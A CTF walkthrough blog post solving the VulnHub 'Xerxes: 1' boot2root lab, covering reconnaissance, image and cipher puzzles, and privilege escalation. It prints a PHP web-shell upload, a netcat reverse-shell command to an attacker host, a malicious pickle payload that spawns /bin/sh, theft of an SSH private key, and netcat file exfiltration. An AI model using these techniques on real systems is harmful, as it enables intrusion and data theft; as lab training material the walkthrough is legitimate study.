<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Xerxes: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/xerxes-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2014-11-24T08:50:41+00:00">November 24, 2014</time><time class="updated" datetime="2025-06-10T20:12:01+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Welcome to another boot2root CTF challenge “Xerxes: 1” uploaded by bas on vulnhub. As, there is a theme, and you will need to snag the flag in order to complete the challenge and you can download it from the given below link<strong>:</strong></span></p>
<p><span style="color: #000000;"><strong>https://download.vulnhub.com/xerxes/xerxes.tar.gz</strong></span></p>
<p><span style="color: #000000;">By author, it has a good variety of techniques needed to get root – no exploit development/buffer overflows. So, on the basis of our experience and knowledge, we have made progress in solving the lab.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Beginner</span></p>
<p><span style="color: #000000;"><strong>Penetrating Methodologies:</strong></span></p>
<ul>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Surfing HTTP web services</span></li>
<li><span style="color: #000000;">Directory bruteforcing (Dirb)</span></li>
<li><span style="color: #000000;">Base64 decoding</span></li>
<li><span style="color: #000000;">Gimp Editor to zoom image and find the hint</span></li>
<li><span style="color: #000000;">Decimal to ASCII, Brainfuck decrypting</span></li>
<li><span style="color: #000000;">Search and Capture the flag at various stages</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>Walkthrough</u></strong></span></p>
<p><span style="color: #000000;">The first step is as always, running netdiscover on the VM to grab the IP address. In my case, the IP was 192.168.1.102.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-VufRUKQLplU/W_kPP9O0-bI/AAAAAAAAbUg/r-iiE6r5v2oWxYDvLQ0V1lDN49ZCbDlCACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now, let us run a scan on the discovered IP address to see the available ports</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.102</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-mEiSz4LuXag/W_kPS8aN56I/AAAAAAAAbVM/68hH7gQoJj8P3GT9g5Chy9l6oOB7_UJ3wCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">From the nmap scan result, we found port 80 is open for HTTP service, let’s navigate to port 80 in the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YfLULE_Lskw/W_kPUioZUNI/AAAAAAAAbVs/1iqZG_-RB80YF7M5nAYNDpCI9Gh-E5PkwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">When we didn’t find any remarkable clue from its home page, then without wasting much time, I use dirb for web directory enumeration and executed the following command:</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.102</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XcbVzAOiBU0/W_kPVGgn20I/AAAAAAAAbVw/WZ5QPwCO9IEdnBtngroQM4fv5suT0nu3QCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">From the above scan we found that there is another directory <strong>/dev,</strong> so let’s browse it.</span></p>
<p><span style="color: #000000;">http://192.168.1.102/dev</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7TFeL35Kj1o/W_kPVJNOcXI/AAAAAAAAbV4/BHKbNhgYH58Ny3J1CIcm1EhSkhsJ85lYACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Here we found the link provided for <strong>forgot password</strong>, so we will browse it to see if there is something useful.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-nDEZ5nywMAQ/W_kPVC6Ca7I/AAAAAAAAbV0/7axYO3aiyysBTu9D97lcs39YjHU_VjsRwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">To our surprise, there is a QR code, so let’s scan it to see what is hidden inside. On scanning QR code we found a base64 encoded text.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-04_eUy6K56U/W_kPVYIt2XI/AAAAAAAAbV8/SfzJGWfw9-ImSmOrHb26nyNGKqoOVLb4QCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now let’s decode the base64 string to find if there is any hint or useful information available.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ooSL-8BLjLU/W_kPVuAwLTI/AAAAAAAAbWA/VyvhOimAFTI0CFW2Yt-PqFVls7XyJ-6FwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">The clue said look deeper, so we tried to zoom the image and found that there are some different pixels on the top left of the image. To read that we used the color-picker tool in the GIMP editor. To do this, we used Gimp Editor tool and used the option <strong>Open in Layers </strong>in the File menu, after that we deselected all the layers except the alpha layer of the image, then used the Color-Picker tool from the Tools menu to find the alpha values of the pixels</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-jqekUrBj8ck/W_kPV86tjuI/AAAAAAAAbWE/JgmIQ0dviP4TsWr8M3sz0mUYi3dYtGuDACLcBGAs/s1600/9.PNG"/></span></p>
<p><span style="color: #000000;">After collecting all the alpha values, we’ll find the ASCII characters of the decimal values we found.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-6daJh68jfx4/W_kPQffDxNI/AAAAAAAAbUo/X63eYU3PoAgNg2mC2_E8lsapffECsb5OQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now, we came to know that the ASCII chars are actually the base64 encoded value, so let’s decrypt and see what we get.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-_2njohAwc_I/W_kPQBjluLI/AAAAAAAAbUk/jcZf1JQLP8U2MyjPJQPIQ0QiXIQu7jvKwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">After decoding the base64 we found that it is another encryption named BrainFuck, let’s try to decrypt the BrainFuck encrypted string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YOx3tnkOHJw/W_kPQkd6eUI/AAAAAAAAbUs/XigYkG72bPMhU9dl_Ba1SqUboYXFn22-ACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now let us try to use this value as a password to upload our file, after trying to upload PHP shell, we tried to upload shell in “pht” extension.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-umrdNzZAXLQ/W_kPQm1sHeI/AAAAAAAAbUw/jXDIo605LuYK-MJe8-wAbZY0w42TGuWJwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now access the shell from URL and run ls command to check if the shell has created the RCE vulnerability.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UsAdk9AyICM/W_kPRAkW0xI/AAAAAAAAbU0/0lU-ne_KTEE_REbBHDp1oEM5GijTzs6agCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Since it was vulnerable to RCE, therefore we can exploit the victim’s machine by executing the following command.</span></p>
<pre class="lang:default decode:true ">http://192.168.1.102/dev/upload/shell.pht?cmd=nc -e /bin/bash 192.168.1.109 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WEngBxAv55o/W_kPRaFVLSI/AAAAAAAAbU4/YG3gIxPpfkocTos9MLkBNLq6JZzxVwSnACLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">On the other hand, keep the netcat listener active on the kali terminal,</span></p>
<pre class="lang:default decode:true">nc -lvp 1234</pre>
<p><span style="color: #000000;">As soon as we get our reverse connection, the first thing we do is to upgrade our session into a more interactive one, so we will use python one-liner to upgrade our session from sh to bash</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">Now let’s go home and find the number of users</span></p>
<pre class="lang:default decode:true">cd /home
ls</pre>
<p><span style="color: #000000;">Here we found that there are 3 users named amanpour, curtiz, and Delacroix, we will first head in amanpour and check the contents</span></p>
<pre class="lang:default decode:true">cd amanpour
ls -la</pre>
<p><span style="color: #000000;">Here we found .bash_history file, now we will check the contents of the file</span></p>
<pre class="lang:default decode:true">cat .bash_history</pre>
<p><span style="color: #000000;">In this file, you will find the python command for a new password, run the command and you will find the password</span></p>
<pre class="lang:default decode:true">python steqr.py -f newpassword</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-AdWqsGcxw3I/W_kPRYQ_pmI/AAAAAAAAbU8/i0TrM5uvp-0cJ97u_cx5sL68ET1DKeoeACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now we got the password of amanpour so let’s try to connect to amanpour using these credentials</span></p>
<pre class="lang:default decode:true">ssh amanpour@192.168.1.102</pre>
<p><span style="color: #000000;">Here we will search for files with suid permissions</span></p>
<pre class="lang:default decode:true">find / -perm -4000 -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">here we found the file /opt/notes, so let’s go in /opt file to find the files inside it, here along with notes we will also find notes.py, so we will see the contents of notes.py file.</span></p>
<pre class="lang:default decode:true">cd /opt
ls
cat notes.py</pre>
<p><span style="color: #000000;">Here we will find out that whatever the file needs to be loaded in the notes executable should either be in /home/curtiz or the file path should start with ../../ as to first go to directory backwards and then provide the full path from / directory<br/>
</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FQsLuVZ-7_A/W_kPSEavckI/AAAAAAAAbVA/a17wt9ULIUwVRA3N6m-EkfFsvFgdILx-ACLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">In notes.py, we find that the script is using the pickle module. Now the pickle module is vulnerable to insecure de-serialization. So we can execute any code of our choice. As we can load the file in the script we created a file that executes “/bin/sh”</span></p>
<pre class="lang:default decode:true">cat &gt; /tmp/shell
cos
system
(S'/bin/sh'
tR.</pre>
<p><span style="color: #000000;">Now execute the notes executable file and load the shell file directly from tmp directory</span></p>
<pre class="lang:default decode:true">./notes
load ../../tmp/shell</pre>
<p><span style="color: #000000;">As soon we run load /tmp/shell we spawn a shell and when we checked the id, we found that the amanpour is also a member of curtiz group, so we will now go to curtiz home directory</span></p>
<pre class="lang:default decode:true">cd /home/curtiz</pre>
<p><span style="color: #000000;">When we check the content of the directory, we find a file called notes. We take look at the content of notes and find a hint to log in through user Marie.</span></p>
<pre class="lang:default decode:true">ls
cat notes</pre>
<p><span style="color: #000000;">We check passwd file to find if user “Marie” exists. After opening the file, we find that the “Marie” is the first name for user “delacroix”. We also find that it uses a custom shell called “/bin/delacroix”.</span></p>
<pre class="lang:default decode:true ">cat /etc/passwd | grep "Marie"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-99HBDcLPXgY/W_kPSY_LOMI/AAAAAAAAbVI/_FvwesFva1slSyc8RxQnNNtCdOLgRk9ewCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Now let’s see the contents of “/bin/delacroix” using strings function, here you’ll find an md5 hash</span></p>
<pre class="lang:default decode:true">strings /bin/delacroix</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-FFbmX_FF0vY/W_kPST6TIOI/AAAAAAAAbVE/kSr3sulINXc1XPcmn4tJG4GA6EFrq77eQCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now let’s decrypt the md5 value online, it will give us the result as “VonBraun”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-CP97L4WVceo/W_kPTGldK-I/AAAAAAAAbVQ/oCRQxFqEKpgQ2-61lCNgKCh0Mots0bJawCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Now let’s try to connect as Delacroix via SSH with this password, but we are unable to successfully log in.</span></p>
<pre class="lang:default decode:true">ssh delacroix@192.168.1.102</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Z-h4daY6mWo/W_kPTSTXkyI/AAAAAAAAbVU/c31ErdSCZ_It8UD1pyaYFQd3lo0fd2DRQCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">In /home/curtiz directory, there was a file called id_rsa. We check the content of the file and find it is RSA private key.</span></p>
<pre class="lang:default decode:true">cat id_rsa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rNhrtKxNM0c/W_kPTg4lr3I/AAAAAAAAbVY/83gt5Jn7dp0lvPvsH91dcLBdnNvlReRmgCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">We copy the RSA key from the target machine to our machine. Now when we log in through SSH using the private key.</span></p>
<pre class="lang:default decode:true">ssh -i id_rsa delacroix@192.168.1.102</pre>
<p><span style="color: #000000;">After logging in, we will check the contents of the “/home/delacroix” directory only to discover two files check.sh and generate.sh. “check.sh” script provides the customized login message. The script “generate.sh” creates a new “.last” file and uses the timestamp of the file to generate a unique md5.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-S1d1iB9JK9A/W_kPT7BhCPI/AAAAAAAAbVc/ODIboI30m3Q66tC4_JwpD7b9W0U7zZ31QCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">So now we will need to find the md5 hash value of the creation time of “.last” file, for that first we will use stat command to check  the time when  the file was created</span></p>
<pre class="lang:default decode:true">stat .last</pre>
<p><span style="color: #000000;">After getting the timestamp of “.last” file, it’s time to get the md5 hash value, for this we’ll use md5sum function along with echo command to get the md5 hash. We are going to use the time at which Marie created the file</span></p>
<pre class="lang:default decode:true">echo 00:19:51 |md5sum</pre>
<p><span style="color: #000000;">Now we have the password too, so let’s capture the flag, open the root terminal using sudo bash command along with the password we found and BOOM. You’re logged in as root now.</span></p>
<p><span style="color: #000000;">Look around to find the flag now, use the cd command to go to the root directory and use ls to check the contents of the directory. You will find file flag here.</span></p>
<pre class="lang:default decode:true">cd /root
ls</pre>
<p><span style="color: #000000;">When we see the type of flag file, it displayed that it is a png image data</span></p>
<pre class="lang:default decode:true">file flag</pre>
<p><span style="color: #000000;">Let’s use netcat to transfer this file to our kali machine</span></p>
<pre class="lang:default decode:true">nc 192.168.1.109 5555 &lt; flag</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UmnMRTKxGvA/W_kPUDrFh9I/AAAAAAAAbVg/4eBaYyW9L38OX8B4Q1bSNnpJwUUvfb3hACLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">In the meanwhile, you should also start netcat listener in the kali machine with directing the incoming file to a new file</span></p>
<pre class="lang:default decode:true">nc -lvp 5555 &gt; flag</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-YEEW_9SHSJg/W_kPUAGt4kI/AAAAAAAAbVk/b443kGu19Wg8EwCC1-okhW5pK1JtarU0ACLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Now finally we open the flag file and it’s done.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-KKf3HfTM-pQ/W_kPUfqNONI/AAAAAAAAbVo/TsARzkMYBegDvWBsrYKB4d6U5Q-CTSVHQCLcBGAs/s1600/26.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>:  Deepanshu is a Certified Ethical Hacker and a budding Security researcher. Contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/deepanshu-k-a4248b138/">here</a>.</strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
